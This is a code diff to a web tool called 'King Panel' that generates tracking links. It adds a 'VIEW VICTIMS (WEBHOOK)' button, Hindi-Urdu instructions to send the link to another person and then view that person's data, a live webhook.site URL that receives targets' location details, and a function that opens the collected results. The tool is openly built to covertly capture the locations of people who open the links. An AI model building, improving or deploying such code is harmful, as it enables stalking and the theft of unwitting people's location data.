@@ -50,6 +50,24 @@
             }
         }
 
+        @keyframes pulse-glow {
+            0% {
+                box-shadow: 0 0 5px #ffbc00;
+            }
+
+            50% {
+                box-shadow: 0 0 20px #ffbc00;
+            }
+
+            100% {
+                box-shadow: 0 0 5px #ffbc00;
+            }
+        }
+
+        .pulse {
+            animation: pulse-glow 2s infinite;
+        }
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: var(--bg);
@@ -283,8 +301,16 @@
         <h3>King Panel</h3>
         <button class="nav-btn active" onclick="showSection('main-ui', this)">Link Creator</button>
         <button class="nav-btn" onclick="showSection('admin-dashboard', this)">King Dashboard</button>
-        <p style="font-size: 11px; color: var(--primary); margin-top: 20px; opacity: 0.7;">
-            Check Webhook for logs.</p>
+        <button class="nav-btn pulse" style="border-color: #ffbc00; color: #ffbc00; margin-top: 10px;"
+            onclick="openWebhookDashboard()">VIEW VICTIMS (WEBHOOK)</button>
+
+        <div
+            style="font-size: 11px; color: #aaa; margin-top: 20px; padding: 10px; border: 1px dashed #444; border-radius: 5px;">
+            <strong>Instruction:</strong><br>
+            1. Link generate karein.<br>
+            2. Link copy karke <u>dusre bande</u> ko bhejein.<br>
+            3. Jab wo kholega, uska data <strong>VIEW VICTIMS</strong> button par click karne se dikhega.
+        </div>
     </div>
 
     <div class="main-content">
@@ -314,8 +340,12 @@
         <!-- Admin Dashboard Section -->
         <div class="admin-section" id="admin-dashboard">
             <h3>King Dashboard (Recent Activity)</h3>
-            <p style="font-size: 0.8em; color: #888;">Click on "Location" to open Google Maps. Data is saved locally in
-                this browser.</p>
+            <p
+                style="font-size: 0.9em; color: #ffbc00; background: rgba(255,188,0,0.1); padding: 10px; border-radius: 5px; border-left: 5px solid #ffbc00;">
+                <strong>DHYAN DEIN:</strong> Yahan sirf aapke apne browser ke logs dikhenge. Dusron (Targets) ki
+                location dekhne ke liye sidebar mein <strong>"VIEW VICTIMS (WEBHOOK)"</strong> ka button dabayein.
+            </p>
+            <p style="font-size: 0.8em; color: #888; margin-top: 10px;">Click on "Location" to open Google Maps.</p>
             <div style="overflow-x: auto;">
                 <table id="logTable">
                     <thead>
@@ -336,8 +366,8 @@
                 </table>
             </div>
             <button onclick="clearLogs()"
-                style="margin-top: 20px; background: var(--accent); border-color: var(--accent);">Clear All
-                Logs</button>
+                style="margin-top: 20px; background: var(--accent); border-color: var(--accent); width: auto; padding: 10px 20px;">Clear
+                Local Logs</button>
         </div>
 
         <!-- Redirecting Message (Initially Hidden) -->
@@ -366,7 +396,7 @@
         // Aapko apni location details receive karne ke liye ek 'Webhook' ya API ki zarurat hogi.
         // Aap 'https://webhook.site' se ek URL le kar yahan paste kar sakte hain.
         // Jab koi aapka link kholega, uski details is URL par bhej di jayengi.
-        const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Yahan apna Webhook URL daalein! (e.g., "https://webhook.site/your-unique-id")
+        const WEBHOOK_URL = "https://webhook.site/7620f980-9afd-4680-8a3f-17118916cda1"; // Yahan apna Webhook URL daalein! (e.g., "https://webhook.site/your-unique-id")
 
         // --- UI Control Functions ---
         function showSection(id, btn) {
@@ -377,6 +407,16 @@
             btn.classList.add('active');
 
             if (id === 'admin-dashboard') loadLocalLogs();
+        }
+
+        function openWebhookDashboard() {
+            if (WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE")) {
+                alert("Pehle apna Webhook URL code ki line 219 mein paste karein!");
+                return;
+            }
+            // Extracts the unique ID from the webhook.site URL to open the dashboard
+            const webhookId = WEBHOOK_URL.split('/').pop();
+            window.open(`https://webhook.site/#!/${webhookId}`, '_blank');
         }
 
         function generateLink() {
